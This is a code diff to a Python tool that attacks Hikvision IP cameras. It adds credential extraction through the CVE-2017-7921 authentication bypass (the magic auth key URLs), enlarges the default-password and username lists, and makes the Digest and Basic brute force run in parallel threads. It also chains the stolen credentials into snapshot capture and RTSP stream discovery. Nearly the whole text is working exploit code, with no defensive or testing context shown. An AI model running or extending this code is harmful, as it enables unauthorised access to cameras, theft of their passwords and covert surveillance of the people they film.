@@ -22,11 +22,13 @@ import urllib3
 urllib3.disable_warnings()
 
 HIKVISION_PASSWORDS = [
-    "12345", "admin", "admin123", "Admin123", "Admin@123",
-    "hik12345", "Hik12345", "12345678", "password", "123456789",
-    "admin1234", "Admin1234", "admin@123", "Hikvision", "hikvision",
-    "camera", "Camera123", "nvr12345", "Nvr12345", "1234567890",
-    "admin12345", "Admin12345", "Hik@12345", "hik@12345",
+    "", "12345", "admin", "admin123", "Admin123", "Admin@123",
+    "hik12345", "Hik12345", "12345678", "password", "123456",
+    "123456789", "1234567890", "admin1234", "Admin1234",
+    "admin@123", "Hikvision", "hikvision", "camera", "Camera123",
+    "nvr12345", "Nvr12345", "admin12345", "Admin12345",
+    "Hik@12345", "hik@12345", "ipcam", "IPCam", "supervisor",
+    "888888", "666666", "111111", "000000", "pass", "Pass1234",
 ]
 
 RTSP_PATHS = [
@@ -105,48 +107,86 @@ def check_cve_2021_36260(ip, port=80):
 
 
 def check_cve_2017_7921(ip, port=80):
-    """Check for CVE-2017-7921 authentication bypass."""
+    """Check for CVE-2017-7921 authentication bypass and extract credentials."""
     try:
-        # Magic auth key
-        r = requests.get(
+        # Magic auth key bypasses authentication entirely
+        for base_url in [
             f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK",
-            timeout=5, verify=False
-        )
-        if r.status_code == 200 and ("userName" in r.text or "admin" in r.text):
-            return {"vulnerable": True, "data": r.text[:200], "cve": "CVE-2017-7921"}
-
-        # Try ISAPI variant
-        r2 = requests.get(
             f"http://{ip}:{port}/ISAPI/Security/users?auth=YWRtaW46MTEK",
-            timeout=5, verify=False
-        )
-        if r2.status_code == 200 and "userName" in r2.text:
-            return {"vulnerable": True, "data": r2.text[:200], "cve": "CVE-2017-7921"}
-
+        ]:
+            r = requests.get(base_url, timeout=5, verify=False)
+            if r.status_code == 200 and ("userName" in r.text or "admin" in r.text):
+                # Extract credentials from XML response
+                creds = []
+                for m in re.finditer(r"<userName>([^<]+)</userName>.*?<password>([^<]*)</password>",
+                                     r.text, re.DOTALL):
+                    creds.append({"username": m.group(1), "password": m.group(2)})
+                # Also try snapshot bypass to confirm RCE-level access
+                snap_url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
+                snap_r = requests.get(snap_url, timeout=5, verify=False, stream=True)
+                has_snapshot = snap_r.status_code == 200 and "image" in snap_r.headers.get("Content-Type", "")
+                return {
+                    "vulnerable": True,
+                    "data": r.text[:300],
+                    "cve": "CVE-2017-7921",
+                    "credentials": creds,
+                    "snapshot_bypass": has_snapshot,
+                }
         return {"vulnerable": False}
     except Exception as e:
         return {"vulnerable": False, "error": str(e)}
 
 
-def brute_force_hikvision(ip, port=80, username="admin", passwords=None):
-    """Brute force Hikvision digest auth."""
+HIKVISION_USERNAMES = ["admin", "operator", "user", "guest", "root", "service"]
+
+
+def brute_force_hikvision(ip, port=80, usernames=None, passwords=None):
+    """
+    Parallel brute force — tries Digest auth AND Basic auth for each combo.
+    Uses a thread pool so all usernames run concurrently.
+    """
     if passwords is None:
         passwords = HIKVISION_PASSWORDS
+    if usernames is None:
+        usernames = HIKVISION_USERNAMES
 
-    for pwd in passwords:
-        try:
-            r = requests.get(
-                f"http://{ip}:{port}/ISAPI/System/deviceInfo",
-                auth=requests.auth.HTTPDigestAuth(username, pwd),
-                timeout=5, verify=False
-            )
-            if r.status_code == 200:
-                return {"found": True, "username": username, "password": pwd, "data": r.text[:500]}
-        except Exception:
-            pass
-        time.sleep(0.2)
+    found = {}
+    lock  = __import__("threading").Lock()
+    stop  = __import__("threading").Event()
 
-    return {"found": False}
+    def try_user(username):
+        for pwd in passwords:
+            if stop.is_set():
+                return
+            for auth_cls in (requests.auth.HTTPDigestAuth, requests.auth.HTTPBasicAuth):
+                try:
+                    r = requests.get(
+                        f"http://{ip}:{port}/ISAPI/System/deviceInfo",
+                        auth=auth_cls(username, pwd),
+                        timeout=4, verify=False
+                    )
+                    if r.status_code == 200:
+                        with lock:
+                            found["result"] = {
+                                "found": True, "username": username,
+                                "password": pwd,
+                                "auth_type": auth_cls.__name__.replace("HTTP","").replace("Auth",""),
+                                "data": r.text[:500],
+                            }
+                        stop.set()
+                        return
+                except Exception:
+                    pass
+            time.sleep(0.05)
+
+    threads = [__import__("threading").Thread(target=try_user, args=(u,), daemon=True)
+               for u in usernames]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join(timeout=60)
+
+    return found.get("result", {"found": False})
 
 
 def get_device_info(ip, port=80, username="admin", password="12345"):
@@ -255,8 +295,21 @@ def full_hikvision_scan(ip, port=80):
     if findings["cve_2017_7921"].get("vulnerable"):
         findings["risk_level"] = "CRITICAL"
         findings["summary"].append("CVE-2017-7921: Auth bypass CONFIRMED - credentials exposed")
+        # Use extracted plaintext credentials directly — no brute force needed
+        extracted = findings["cve_2017_7921"].get("credentials", [])
+        if extracted:
+            c = extracted[0]
+            findings["credentials"] = {"found": True, "username": c["username"],
+                                        "password": c["password"], "source": "CVE-2017-7921"}
+            findings["summary"].append(f"Plaintext creds extracted: {c['username']}:{c['password']}")
+            findings["device_info"] = get_device_info(ip, port, c["username"], c["password"])
+            snap = capture_snapshot(ip, port, c["username"], c["password"])
+            if snap.get("saved"):
+                findings["summary"].append(f"Snapshot saved: {snap['path']}")
+            findings["rtsp_streams"] = discover_rtsp_streams(ip, c["username"], c["password"])
+            return findings
 
-    # Step 3: Brute force
+    # Step 3: Brute force (tries admin, operator, user, guest)
     creds = brute_force_hikvision(ip, port)
     findings["credentials"] = creds
     if creds.get("found"):
